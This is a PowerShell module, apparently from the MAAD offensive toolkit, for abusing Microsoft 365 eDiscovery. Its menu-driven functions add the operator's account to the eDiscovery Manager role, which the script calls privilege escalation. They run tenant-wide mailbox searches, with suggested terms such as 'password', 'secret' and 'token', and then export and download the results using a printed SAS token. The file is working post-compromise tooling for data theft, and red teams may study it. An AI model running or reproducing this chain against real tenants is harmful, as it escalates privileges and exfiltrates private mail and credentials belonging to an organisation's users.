###Find an Explore E-Discovery cases
function eDiscovery {

    mitre_details("eDiscovery")

    #Establish PS session
    Write-Host "Establishing PS session to compliance portal..."

    try {
        $Comp_Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.compliance.protection.outlook.com/powershell-liveid -Credential $global:AdminCredential -Authentication Basic -AllowRedirection
        Start-Sleep -Seconds 5
        Import-PSSession $Comp_Session -AllowClobber -DisableNameChecking
    }
    catch {
        Write-Host "Failed to establish session with compliance portal with the current credentials!"
        return
    }
    
    #Check privileges
    $role_members = Get-RoleGroupMember "eDiscovery Manager"
    if ($role_members.Name -notin (Get-AzureADUser -ObjectId $global:AdminUsername).DisplayName){
        Write-Host "`nNote: You are currently not eDiscovery Manager which might prevent you from executing certain operations. Start by attempting privilege escalation using eDiscovery module 8 ;)" -ForegroundColor Gray
    }

    $e_discovery_options = @{0 = "Back"; 1 = "Quick Grab And Run"; 2 = "Create a new eDiscovery Search"; 3 = "Recon Existing eDiscovery Cases"; 4 = "Find eDiscovery Case Members"; 5 = "Recon Existing eDiscovery Searches"; 6 = "Find Details of a Search"; 7 = "Export and Download a Search"; 8 = "Escalate eDiscovery Privileges"; 9 = "Install Unified Export Tool"};

    do{
        #Take user choice
        OptionDisplay "eDiscovery Options:" $e_discovery_options

        while ($true) {
            try {
                Write-Host "`n"
                [int]$recon_user_choice = Read-Host -Prompt 'Choose a eDiscovery option:'
                break
            }
            catch {
                Write-Host "Invalid input!!! Choose an option number from the list!"
            }
        }
        
        if ($recon_user_choice -eq 1) {
            #Grab & Run
            AutomatedContentSearch
        }

        if ($recon_user_choice -eq 2) {
            #Create a new eDiscovery Search
            Create_New_Search
        }

        if ($recon_user_choice -eq 3) {
            #Find Existing eDiscovery Cases
            Display_E_Discovery_Cases
        }

        if ($recon_user_choice -eq 4) {
            #Find eDiscovery Case Members
            Display_E_Discovery_Cases $true
            Get-ComplianceCaseMember -Case $selected_case -ShowCaseAdmin
        }

        if ($recon_user_choice -eq 5) {
            #Find Existing eDiscovery Searches
            Display_E_Discovery_Cases $true
            Display_E_Discovery_Case_Searches $false $selected_case
        }

        if ($recon_user_choice -eq 6) {
            #Find Details of a Search
            Display_E_Discovery_Cases $true
            Display_E_Discovery_Case_Searches $true $selected_case
            $export_name = $selected_search + "_Export"

            Get-ComplianceSearch -Identity $selected_search

            try {
                Get-ComplianceSearchAction -Case $selected_case -Identity $export_name -IncludeCredential -Details -ErrorAction Stop
            }
            catch {
                Write-Host "No action for this search has been created yet. Use MAAD's E-Discovery export module if you wish to export contents of this search!!!"
            }
            
        }

        if ($recon_user_choice -eq 7) {
            #Export and Download a Search"
            Display_E_Discovery_Cases $true
            Display_E_Discovery_Case_Searches $true $selected_case
            $export_name = $selected_search + "_Export"

            if ($selected_search -notin "",$null){
                Write-Host "Debug!!!"
                try {
                    New-ComplianceSearchAction -SearchName $selected_search -Export -Format FxStream -ExchangeArchiveFormat PerUserPst -Scope BothIndexedAndUnindexedItems -EnableDedupe $true -SharePointArchiveFormat IndividualMessage -IncludeSharePointDocumentVersions $true -ErrorAction Stop
                    Start-Sleep -Seconds 10
                    Get-ComplianceSearchAction -Case $selected_case -Identity $export_name -IncludeCredential -Details

                    #Start download
                    E_Discovery_Downloader $selected_case $export_name
                }
                catch {
                    Write-Host "Error: Could not export the search. The search results might be too old and need to be re-ran." -ForegroundColor Red
                    Write-Host "MAAD attempting to re-run the selected search..."
                    Start-ComplianceSearch -Identity $selected_search
                    do
                        {
                            Start-Sleep -s 5
                            $complianceSearch = Get-ComplianceSearch -Identity $selected_search
                        }
                    while ($complianceSearch.Status -ne 'Completed')
                    Write-Host "Successfully completed re-run of the selected compliance search!!!" -ForegroundColor Yellow -BackgroundColor Black  
                }
            
                try {
                    New-ComplianceSearchAction -SearchName $selected_search -Export -Format FxStream -ExchangeArchiveFormat PerUserPst -Scope BothIndexedAndUnindexedItems -EnableDedupe $true -SharePointArchiveFormat IndividualMessage -IncludeSharePointDocumentVersions $true -ErrorAction Stop
                    Start-Sleep -Seconds 10
                    Get-ComplianceSearchAction -Case $selected_case -Identity $export_name -IncludeCredential -Details

                    #Start download
                    E_Discovery_Downloader $selected_case $export_name
                }
                catch {
                    Write-Host "Error: Oops, Could not export search again."
                    Write-Host "Obvious Tip: Try with another case/search." -ForegroundColor Gray
                }
            }
            else {
                Write-Host "No search available in selected case to export!!!`n Try another case."
            }
        }

        if ($recon_user_choice -eq 8) {
            #Escalate eDiscovery Privileges
            E_Discovery_Priv_Esc
        }

        if ($recon_user_choice -eq 9) {
            #Install Unified Export Tool
            Install_Unified_Export_Tool
        }

    }while($recon_user_choice -ne 0)
}


#List all the cases 
function Display_E_Discovery_Cases ($selection = $false) {
    #param ($selection = $false)
    $all_e_discovery_cases = Get-ComplianceCase
    Write-Host ""

    Write-Host "eDiscovery cases in the environment" -ForegroundColor Gray
    foreach ($item in $all_e_discovery_cases){
        Write-Host $([array]::IndexOf($all_e_discovery_cases,$item)+1) ':' $item.Name
    } 

    while ($selection) {
        try {
            Write-Host "`n"
            [int]$case_choice = Read-Host -Prompt "Select a case from the list you would like to explore"
            $global:selected_case = $all_e_discovery_cases[$case_choice-1].Name
            break
        }
        catch {
            Write-Host "Invalid input!!! Choose an option number from the list!"
        }   
    }
}

function Display_E_Discovery_Case_Searches ($selection = $false, $case_name) {
    #param ($selection = $false, $case_name)
    $all_case_searches = Get-ComplianceSearch -Case $case_name
    Write-Host ""

    Write-Host "Here are the available searches in the case: $case_name" -ForegroundColor Gray
    if ($all_case_searches -is [array]) {
        foreach ($item in $all_case_searches){
            Write-Host $([array]::IndexOf($all_case_searches,$item)+1) ':' $item.Name
        }
    }
    else {
        $selection = $false
        $global:selected_search = $all_case_searches.Name
        Write-Host $global:selected_search
    }

    while ($selection) {
        try {
            Write-Host "`n"
            [int]$search_choice = Read-Host -Prompt "Select a search from the list you would like to explore"
            $global:selected_search = $all_case_searches[$search_choice-1].Name
            break
        }
        catch {
            Write-Host "Invalid input!!! Choose an option number from the list!"
        }   
    }
}

function E_Discovery_Downloader ($case_name, $export_name){

    $export_tool = ((Get-ChildItem -Path $($env:LOCALAPPDATA + "\Apps\2.0\") -Filter microsoft.office.client.discovery.unifiedexporttool.exe -Recurse).FullName | Where-Object{ $_ -notmatch "_none_" } | Select-Object -First 1)    

    $export_details = Get-ComplianceSearchAction -Case $case_name -Identity $export_name -IncludeCredential -Details    
    ##Export Details
    $export_details = $export_details.Results.split(";")
    $container_url = $export_details[0].trimStart("Container url: ")
    $sas_token = $export_details[1].trimStart(" SAS token: ")

    Write-Host "#######################################################################################"
    Write-Host "Download URL:" $container_url
    Write-Host "Download Key:" $sas_token
    Write-Host "#######################################################################################"

    #Download the exported file from M365
    
    Write-Host "`nInitiating download of export ..."
    Write-Host "Saving export to: " + $export_location
    

    #Start-Process -FilePath $export_tool -ArgumentList $Arguments
    & $export_tool -name $export_name -source $container_url -key $sas_token -dest $export_location -trace true

    Write-Host "Download completed!!!"
    
}

function E_Discovery_Priv_Esc {
    ##Check if account has eDiscovery Manager role
    $role_members = Get-RoleGroupMember "eDiscovery Manager"
    
    if ((Get-AzureADUser -ObjectId $global:AdminUsername).DisplayName -in $role_members.Name){
        Write-Host "`nSometimes life is not that hard ;)"
        Write-Host "You are already eDiscovery Manager!!!" -ForegroundColor Yellow
        return
    }
    else {
        ##Escalate privileges to eDiscovery
        try {
            ##Create PSsession
            $Comp_Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.compliance.protection.outlook.com/powershell-liveid -Credential $global:AdminCredential -Authentication Basic -AllowRedirection 
            Import-PSSession $Comp_Session -AllowClobber

            Write-Host "`nAttempting to escalate privileges to eDiscovery Manager role ..." -ForegroundColor Gray
            Add-RoleGroupMember -Identity "eDiscovery Manager" -Member $global:AdminUsername -ErrorAction Stop
            Write-Host "`nSuccessfully elevated privileges to eDiscovery Manager role!"
            Write-Host "Waiting for changes to take effect..."
            Start-Sleep -Seconds 30
        }
        catch {
            Write-Host "Error: Failed to elevate privileges to eDiscovery Manager"
            break
        }
    }

    ##Create new PSSession
    Write-Host "Re-establishing session with compliance service using elevated privileges..."
    try {
        $Comp_Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.compliance.protection.outlook.com/powershell-liveid -Credential $global:AdminCredential -Authentication Basic -AllowRedirection
        Start-Sleep -Seconds 5
        Import-PSSession $Comp_Session -AllowClobber -DisableNameChecking
    }
    catch {
        Write-Host "Error: Failed to establish new session!" -ForegroundColor Red
    }
}

#Create a new search and export data
function Create_New_Search {
    
    $new_search_choice = Read-Host -Prompt "Create search in a 1.New or 2.Existing case:"

    if ($new_search_choice -eq 1) {
        $case_name = Read-Host -Prompt "Enter a name for your new eDiscovery case"
        $description = "$case_name"
        ##  Create case
        Write-Host "`nCreating new compliance case: $case_name ..."
        New-ComplianceCase -Name $case_name -Description $description
    }

    if ($new_search_choice -eq 2) {
        Display_E_Discovery_Cases $true
        $case_name = $selected_case
    }

    $search_name = Read-Host "Enter a name for the new search:"
    $export_location = ".\Outputs\"

    #Query to use for eDiscovery
    Write-Host "Example: Legal or pass* or secret or CEO or credentials or token or password`n"
    $searchQry = Read-Host -Prompt "Enter a term or multiple search terms separeted by 'or' for e-discovery search"
    Write-Host "`nSearch for terms: $searchQry"
    Start-Sleep -Seconds 3

    ##  Initiate Search query
    $compSearch = New-ComplianceSearch -Case $case_name -Name $search_name -ExchangeLocation all -ContentMatchQuery $searchQry

    ##  Start Actual search
    Write-Host "`nInitiating search..."
    try {
        Start-ComplianceSearch -Identity $search_name -ErrorAction Stop
    }
    catch {
        Write-Host "Failed to start compliance search!" -ForegroundColor Red
        break
    }
    
    do
        {
            Start-Sleep -s 5
            $complianceSearch = Get-ComplianceSearch -Identity $search_name
        }
    while ($complianceSearch.Status -ne 'Completed')
    Write-Host "Compliance Search completed!!!" -ForegroundColor Yellow -BackgroundColor Black

    Read-Host -Prompt "Press enter to see details of the compliance search:"
    Get-ComplianceSearch -Identity $search_name | fl
}

function Install_Unified_Export_Tool {
    
    ###This unified export tool installer module is thanks to Dale O'Grady's script for attack lab and is essentially a copy of that###
    ##Check if microsoft.office.client.discovery.unifiedexporttool.exe tool is already installed. Install it otherwise
    While (-Not ((Get-ChildItem -Path $($env:LOCALAPPDATA + "\Apps\2.0\") -Filter microsoft.office.client.discovery.unifiedexporttool.exe -Recurse).FullName | Where-Object{ $_ -notmatch "_none_" } | Select-Object -First 1)){
        Write-Host "Downloading Unified Export Tool ."
        Write-Host "This is installed per-user by the Click-Once installer."

        # Credit to Jos Verlinde for his code in Load-ExchangeMFA in the Powershell Gallery!
        # https://www.powershellgallery.com/packages/Load-ExchangeMFA/1.2

        $Manifest = "https://complianceclientsdf.blob.core.windows.net/v16/Microsoft.Office.Client.Discovery.UnifiedExportTool.application"
        $ElevatePermissions = $true
        Try {
            Add-Type -AssemblyName System.Deployment
            Write-Host "Starting installation of ClickOnce Application $Manifest "
            $RemoteURI = [URI]::New( $Manifest , [UriKind]::Absolute)
            if (-not  $Manifest){
                throw "Invalid ConnectionUri parameter '$ConnectionUri'"
            }
            $HostingManager = New-Object System.Deployment.Application.InPlaceHostingManager -ArgumentList $RemoteURI , $False
            Register-ObjectEvent -InputObject $HostingManager -EventName GetManifestCompleted -Action { 
                new-event -SourceIdentifier "ManifestDownloadComplete"
            } | Out-Null
            Register-ObjectEvent -InputObject $HostingManager -EventName DownloadApplicationCompleted -Action { 
                new-event -SourceIdentifier "DownloadApplicationCompleted"
            } | Out-Null
            $HostingManager.GetManifestAsync()
            $event = Wait-Event -SourceIdentifier "ManifestDownloadComplete" -Timeout 15
            if ($event ) {
                $event | Remove-Event
                Write-Host "ClickOnce Manifest Download Completed"
                $HostingManager.AssertApplicationRequirements($ElevatePermissions)
                $HostingManager.DownloadApplicationAsync()
                $event = Wait-Event -SourceIdentifier "DownloadApplicationCompleted" -Timeout 60
                if ($event ) {
                    $event | Remove-Event
                    Write-Host "ClickOnce Application Download Completed"
                }
                else {
                    Write-error "ClickOnce Application Download did not complete in time (60s)"
                }
            }
            else {
                Write-error "ClickOnce Manifest Download did not complete in time (15s)"
            }
        }
        finally {
            Get-EventSubscriber|? {$_.SourceObject.ToString() -eq 'System.Deployment.Application.InPlaceHostingManager'} | Unregister-Event
        }
    }
    Write-Host "Unified Export tool already installed. You are all set here!" -BackgroundColor Black -ForegroundColor Yellow
}